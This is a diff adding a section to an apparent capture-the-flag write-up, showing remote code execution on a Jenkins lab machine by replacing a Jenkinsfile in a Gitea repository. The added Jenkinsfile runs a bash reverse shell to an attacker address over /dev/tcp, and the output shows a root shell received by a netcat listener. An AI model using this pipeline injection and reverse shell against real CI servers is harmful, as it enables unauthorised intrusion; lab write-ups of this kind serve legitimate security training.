@@ -480,3 +480,59 @@ With these credentials we can log into the `Gitea` instance as the user `buildad
 ![6](../../../assets/images/Build/6.png)
 
 <br />
+
+# Remote Code Execution via Jenkinsfile 
+
+<br />
+
+At this point, we can manipulate the above enumerated Jenkins pipeline trying to execute a shell command on the target system. To do that, we start a listener:
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+Listening on 0.0.0.0 443
+```
+
+<br />
+
+And access the `dev` repository to replace the `Jenkinsfile` with the following code:
+
+<br />
+
+```groovy
+pipeline {
+    agent any
+
+    stages {
+        stage('Do nothing') {
+            steps {
+                sh 'bash -c "bash -i >& /dev/tcp/10.10.14.253/443 0>&1"'
+            }
+        }
+    }
+}
+```
+
+<br />
+
+After a few seconds:
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.234.169 50108
+bash: cannot set terminal process group (8): Inappropriate ioctl for device
+bash: no job control in this shell
+root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main#
+```
+
+<br />
+
+We received the reverse shell connection.
+
